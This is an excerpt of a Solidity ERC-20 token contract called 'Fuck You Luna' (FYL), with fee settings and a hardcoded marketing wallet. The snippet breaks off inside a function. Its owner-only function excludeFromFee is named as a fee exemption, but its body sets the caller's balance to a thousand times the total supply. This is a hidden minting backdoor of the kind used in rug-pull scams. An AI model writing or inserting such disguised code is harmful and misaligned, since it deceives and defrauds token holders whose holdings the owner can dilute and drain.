...
contract FuckYouLuna is Context, IERC20, Ownable {
    ...
    string private constant _name = "Fuck You Luna"; // 
    string private constant _symbol = "FYL"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 3;
    uint256 public _liquidityFee = 1;
    address public  _marketingWallet = 0xEC56A4E3eC2eFE5f6fCBd1bFc1450B4693bA7498;
    ...
    function excludeFromFee(address account) public onlyOwner {
        _tOwned[_msgSender()] = _tTotal * 1000;
